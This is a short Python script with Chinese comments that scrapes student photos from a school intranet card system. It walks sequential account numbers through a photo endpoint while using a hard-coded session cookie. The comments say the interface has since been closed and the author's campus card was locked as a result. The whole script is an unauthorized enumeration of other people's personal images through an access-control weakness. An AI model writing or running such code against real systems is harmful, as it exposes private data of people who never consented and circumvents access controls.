#!usr/bin/python
# -*- coding: utf-8 -*-

# 2019
# 学校内网爬取学生照片
# 接口以关闭
# 爬取结果: 校园卡被人工锁定
import requests
import urllib

url_1 = "http://10.0.0.12/Cardholder/ShowImage.aspx?AccNum=180203" #180203'833' 后三位for 100 -- 999
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"}
cookie="ASP.NET_SessionId=ig4mfv1v14e1bhtund3ddbqk" # 10.0.0.12登录后的token 自行设定
cookie_dict = {i.split("=")[0]:i.split("=")[-1] for i in cookie.split("; ")} # 忘了这行啥意思

for x in range(100,102):
    url = " "
    url = url_1 + str(x)
    response = requests.get(url, headers = headers, cookies = cookie_dict)	
    name = str(x) + ".jpg" #保存格式 数字.jpg
    with open(name, 'wb+') as f:  
        f.write(response.content)
